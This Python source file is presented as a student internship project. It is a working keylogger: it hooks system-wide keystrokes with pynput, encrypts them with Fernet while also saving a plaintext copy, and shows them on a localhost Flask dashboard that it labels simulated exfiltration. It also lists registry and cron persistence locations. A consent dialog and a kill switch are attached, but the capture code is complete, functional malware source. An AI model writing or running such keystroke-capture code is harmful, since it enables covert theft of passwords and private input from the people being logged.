#!/usr/bin/env python3
"""
Educational Keylogger for Cybersecurity Internship Project #3
Objective: Build a proof-of-concept keylogger that encrypts logs and simulates exfiltration
Student Internship Project - Educational Purpose Only
Submission Date: July 28, 2025
"""

import os
import sys
import time
import json
import threading
from datetime import datetime
from pathlib import Path
import tkinter as tk
from tkinter import messagebox, simpledialog

# Third-party imports
try:
    from pynput import keyboard
    from cryptography.fernet import Fernet
    from flask import Flask, render_template_string, request, jsonify
except ImportError as e:
    print(f"Missing required packages. Please install: pip install pynput cryptography flask")
    sys.exit(1)

class EducationalKeylogger:
    def __init__(self):
        # Educational and ethical setup
        self.educational_mode = True
        self.consent_given = False
        self.project_info = {
            "project": "Cybersecurity Internship Project #3",
            "objective": "Keylogger with Encrypted Data Exfiltration",
            "student": "Educational Purpose Only",
            "date": "July 28, 2025"
        }
        
        # Core functionality
        self.log_file = "encrypted_keystrokes.log"
        self.metadata_file = "session_metadata.json"
        self.key_file = "encryption.key"
        self.running = False
        self.listener = None
        self.flask_thread = None
        
        # Load or generate encryption key
        self.key = self.load_key()
        self.cipher = Fernet(self.key)
        
        # Initialize Flask app
        self.app = Flask(__name__)
        self.setup_flask_routes()
        
    def write_key(self):
        """Generates a key and saves it into a file"""
        print("[INFO] Generating new encryption key...")
        key = Fernet.generate_key()
        with open(self.key_file, "wb") as key_file:
            key_file.write(key)
        print(f"[INFO] Encryption key saved to {self.key_file}")
        return key
    
    def load_key(self):
        """Loads the key from the encryption.key file"""
        try:
            with open(self.key_file, "rb") as key_file:
                key = key_file.read()
            print(f"[INFO] Encryption key loaded from {self.key_file}")
            return key
        except FileNotFoundError:
            print(f"[INFO] No existing key file found. Creating new key...")
            return self.write_key()
    
    def show_consent_dialog(self):
        """Display educational consent dialog"""
        root = tk.Tk()
        root.withdraw()  # Hide main window
        
        consent_message = f"""
EDUCATIONAL CYBERSECURITY INTERNSHIP PROJECT

Project: {self.project_info['project']}
Objective: {self.project_info['objective']}
Student: {self.project_info['student']}
Date: {self.project_info['date']}

⚠️  EDUCATIONAL USE ONLY ⚠️

This keylogger is developed for educational purposes as part of a 
cybersecurity internship project. It demonstrates:
- Keystroke capture techniques
- Encryption using Fernet
- Simulated data exfiltration
- Ethical security research

By clicking 'Yes', you consent to educational keystroke logging 
on this system for demonstration purposes only.

Do you consent to this educational demonstration?
        """
        
        result = messagebox.askyesno("Educational Consent Required", consent_message)
        root.destroy()
        return result
    
    def log_keystroke(self, key_data):
        """Log encrypted keystroke with timestamp"""
        timestamp = datetime.now().isoformat()
        log_entry = {
            "timestamp": timestamp,
            "key": key_data,
            "session": "educational_demo"
        }
        
        # Encrypt the log entry
        encrypted_data = self.cipher.encrypt(json.dumps(log_entry).encode())
        
        # Append to encrypted log file
        with open(self.log_file, "ab") as f:
            f.write(encrypted_data + b"\n")
        
        # Also store decrypted version for educational dashboard
        decrypted_file = "decrypted_logs_for_dashboard.json"
        try:
            with open(decrypted_file, "r") as f:
                logs = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            logs = []
        
        logs.append(log_entry)
        
        with open(decrypted_file, "w") as f:
            json.dump(logs, f, indent=2)
        
        print(f"[LOG] Encrypted keystroke: {key_data}")
    
    def on_key_press(self, key):
        """Handle key press events"""
        try:
            # Check for kill switch (ESC key)
            if key == keyboard.Key.esc:
                print("\n[INFO] Kill switch activated (ESC key). Stopping keylogger...")
                self.stop_logging()
                return False
            
            # Process different key types
            if hasattr(key, 'char') and key.char:
                key_data = key.char
            else:
                key_data = f"[{key.name}]" if hasattr(key, 'name') else str(key)
            
            self.log_keystroke(key_data)
            
        except Exception as e:
            print(f"[ERROR] Key processing error: {e}")
    
    def start_logging(self):
        """Start the keylogger"""
        if not self.consent_given:
            print("[ERROR] Educational consent required before starting.")
            return False
        
        print("\n" + "="*60)
        print("🎓 EDUCATIONAL KEYLOGGER STARTED")
        print("="*60)
        print(f"Project: {self.project_info['project']}")
        print(f"Encryption Key File: {self.key_file}")
        print(f"Encrypted Log File: {self.log_file}")
        print("Press ESC key to activate kill switch")
        print("Press Ctrl+C to stop")
        print("="*60)
        
        self.running = True
        
        # Start Flask server in background
        self.flask_thread = threading.Thread(target=self.run_flask_server, daemon=True)
        self.flask_thread.start()
        
        # Start keystroke listener
        try:
            with keyboard.Listener(on_press=self.on_key_press) as listener:
                self.listener = listener
                listener.join()
        except KeyboardInterrupt:
            print("\n[INFO] Ctrl+C detected. Stopping keylogger...")
            self.stop_logging()
    
    def stop_logging(self):
        """Stop the keylogger"""
        self.running = False
        print("\n[INFO] Educational keylogger stopped.")
        print(f"[INFO] Encrypted logs saved to: {self.log_file}")
        print(f"[INFO] Encryption key stored in: {self.key_file}")
        print("[INFO] Dashboard available at: http://localhost:5000")
        
        # Save session metadata
        metadata = {
            "project": self.project_info,
            "session_end": datetime.now().isoformat(),
            "key_file": self.key_file,
            "log_file": self.log_file,
            "educational_mode": self.educational_mode
        }
        
        with open(self.metadata_file, "w") as f:
            json.dump(metadata, f, indent=2)
    
    def decrypt_logs_for_viewing(self, encrypted_key=None):
        """Decrypt logs for educational viewing"""
        if not os.path.exists(self.log_file):
            return []
        
        # Use provided key or default key
        decrypt_key = encrypted_key.encode() if encrypted_key else self.key
        cipher = Fernet(decrypt_key)
        
        decrypted_logs = []
        try:
            with open(self.log_file, "rb") as f:
                for line in f:
                    if line.strip():
                        try:
                            decrypted_data = cipher.decrypt(line.strip())
                            log_entry = json.loads(decrypted_data.decode())
                            decrypted_logs.append(log_entry)
                        except Exception as e:
                            print(f"[WARNING] Could not decrypt log entry: {e}")
            
        except Exception as e:
            print(f"[ERROR] Could not read encrypted logs: {e}")
        
        return decrypted_logs
    
    def setup_flask_routes(self):
        """Setup Flask web server routes"""
        
        @self.app.route('/')
        def dashboard():
            """Educational dashboard"""
            return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <title>Educational Keylogger Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }
        .header { background-color: #2c3e50; color: white; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
        .warning { background-color: #e74c3c; color: white; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .info-box { background-color: white; padding: 20px; border-radius: 5px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .log-entry { background-color: #ecf0f1; padding: 10px; margin: 5px 0; border-radius: 3px; font-family: monospace; }
        .decrypt-form { background-color: #3498db; color: white; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
        input[type="text"] { width: 300px; padding: 10px; margin: 10px; border: none; border-radius: 3px; }
        button { background-color: #27ae60; color: white; padding: 10px 20px; border: none; border-radius: 3px; cursor: pointer; }
        button:hover { background-color: #229954; }
        .status { color: #27ae60; font-weight: bold; }
        .key-info { background-color: #f39c12; color: white; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🎓 Educational Keylogger Dashboard</h1>
        <p><strong>Project:</strong> {{ project_info.project }}</p>
        <p><strong>Objective:</strong> {{ project_info.objective }}</p>
        <p><strong>Date:</strong> {{ project_info.date }}</p>
    </div>
    
    <div class="warning">
        ⚠️ <strong>EDUCATIONAL PURPOSE ONLY</strong> - This is a cybersecurity internship project for learning malware analysis and encryption techniques.
    </div>
    
    <div class="key-info">
        🔐 <strong>Encryption Key Management</strong><br>
        Key File: {{ key_file }}<br>
        Key Status: Active and loaded from file<br>
        Encryption: Fernet (AES 128 in CBC mode)
    </div>
    
    <div class="info-box">
        <h3>📊 Session Status</h3>
        <p class="status">✅ Educational keylogger running</p>
        <p><strong>Encrypted Log File:</strong> {{ log_file }}</p>
        <p><strong>Total Encrypted Entries:</strong> {{ log_count }}</p>
        <p><strong>Last Updated:</strong> {{ last_update }}</p>
    </div>
    
    <div class="decrypt-form">
        <h3>🔓 Decrypt Logs for Educational Review</h3>
        <p>Enter the decryption key to view captured keystrokes:</p>
        <form method="post" action="/decrypt">
            <input type="text" name="decrypt_key" placeholder="Enter Fernet decryption key" required>
            <button type="submit">Decrypt and View Logs</button>
        </form>
        <p><small>💡 Hint: The key is stored in {{ key_file }}</small></p>
    </div>
    
    <div class="info-box">
        <h3>🛡️ Educational Features Demonstrated</h3>
        <ul>
            <li>✅ Cross-platform keystroke capture (Windows/Linux)</li>
            <li>✅ Fernet encryption with file-based key storage</li>
            <li>✅ Local storage with timestamps</li>
            <li>✅ Simulated data exfiltration (localhost server)</li>
            <li>✅ Kill switch implementation (ESC key)</li>
            <li>✅ Ethical constraints and consent mechanisms</li>
        </ul>
    </div>
    
    <div class="info-box">
        <h3>🔧 Technical Implementation</h3>
        <p><strong>Encryption Key Storage:</strong> {{ key_file }}</p>
        <p><strong>Key Format:</strong> 32 url-safe base64-encoded bytes</p>
        <p><strong>Encryption Algorithm:</strong> Fernet (AES-128 in CBC mode with HMAC)</p>
        <p><strong>Persistence Method:</strong> File-based key storage for session continuity</p>
    </div>
</body>
</html>
            """, 
            project_info=self.project_info,
            key_file=self.key_file,
            log_file=self.log_file,
            log_count=self.get_log_count(),
            last_update=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            )
        
        @self.app.route('/decrypt', methods=['POST'])
        def decrypt_logs():
            """Decrypt and display logs"""
            decrypt_key = request.form.get('decrypt_key')
            
            if not decrypt_key:
                return "Decryption key required", 400
            
            try:
                # Try to decrypt with provided key
                logs = self.decrypt_logs_for_viewing(decrypt_key)
                
                return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <title>Decrypted Educational Logs</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }
        .header { background-color: #2c3e50; color: white; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
        .warning { background-color: #e74c3c; color: white; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .log-entry { background-color: white; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 4px solid #3498db; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .timestamp { color: #7f8c8d; font-size: 0.9em; }
        .keystroke { font-family: monospace; background-color: #ecf0f1; padding: 5px; border-radius: 3px; }
        button { background-color: #3498db; color: white; padding: 10px 20px; border: none; border-radius: 3px; cursor: pointer; text-decoration: none; display: inline-block; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔓 Decrypted Educational Logs</h1>
        <a href="/" style="color: white;">← Back to Dashboard</a>
    </div>
    
    <div class="warning">
        📚 <strong>EDUCATIONAL CONTENT</strong> - These logs demonstrate encrypted keystroke capture for cybersecurity learning purposes.
    </div>
    
    <h3>📝 Captured Keystrokes ({{ log_count }} entries)</h3>
    
    {% for log in logs %}
    <div class="log-entry">
        <div class="timestamp">{{ log.timestamp }}</div>
        <div class="keystroke">{{ log.key }}</div>
        <small>Session: {{ log.session }}</small>
    </div>
    {% endfor %}
    
    {% if not logs %}
    <div class="log-entry">
        <p>No logs found or incorrect decryption key provided.</p>
    </div>
    {% endif %}
    
</body>
</html>
                """, logs=logs, log_count=len(logs))
                
            except Exception as e:
                return f"Decryption failed: Invalid key or corrupted data. Error: {e}", 400
        
        @self.app.route('/api/status')
        def api_status():
            """API endpoint for status"""
            return jsonify({
                "status": "running" if self.running else "stopped",
                "project": self.project_info,
                "key_file": self.key_file,
                "log_file": self.log_file,
                "log_count": self.get_log_count(),
                "educational_mode": self.educational_mode
            })
    
    def get_log_count(self):
        """Count number of log entries"""
        try:
            with open(self.log_file, "rb") as f:
                return sum(1 for line in f if line.strip())
        except FileNotFoundError:
            return 0
    
    def run_flask_server(self):
        """Run Flask server for educational dashboard"""
        try:
            print(f"[INFO] Educational dashboard starting at http://localhost:5000")
            self.app.run(host='localhost', port=5000, debug=False, use_reloader=False)
        except Exception as e:
            print(f"[ERROR] Flask server error: {e}")
    
    def demonstrate_persistence(self):
        """Educational demonstration of persistence techniques"""
        print("\n🎓 EDUCATIONAL: Demonstrating Persistence Techniques")
        print("="*60)
        print("In a real-world scenario, malware might use:")
        print("• Windows: Registry entries (HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)")
        print("• Linux: Cron jobs or systemd services")
        print("• Cross-platform: Startup folder manipulation")
        print("\n⚠️  This demonstration does NOT implement actual persistence")
        print("    for ethical and safety reasons.")
        print("="*60)

def main():
    """Main function to run educational keylogger"""
    print("🎓 Educational Keylogger - Cybersecurity Internship Project")
    print("="*60)
    
    # Initialize keylogger
    keylogger = EducationalKeylogger()
    
    # Show educational information
    print(f"Project: {keylogger.project_info['project']}")
    print(f"Objective: {keylogger.project_info['objective']}")
    print(f"Student: {keylogger.project_info['student']}")
    print(f"Date: {keylogger.project_info['date']}")
    print("="*60)
    
    # Get educational consent
    print("\n📋 Requesting educational consent...")
    keylogger.consent_given = keylogger.show_consent_dialog()
    
    if not keylogger.consent_given:
        print("❌ Educational consent not provided. Exiting.")
        return
    
    print("✅ Educational consent provided.")
    
    # Demonstrate persistence techniques (educational only)
    keylogger.demonstrate_persistence()
    
    try:
        # Start the educational keylogger
        keylogger.start_logging()
    except KeyboardInterrupt:
        print("\n[INFO] Program interrupted by user.")
    except Exception as e:
        print(f"\n[ERROR] Unexpected error: {e}")
    finally:
        keylogger.stop_logging()
        print(f"\n🎓 Educational demonstration complete.")
        print(f"📄 Submission ready for: {keylogger.project_info['date']}")

if __name__ == "__main__":
    main()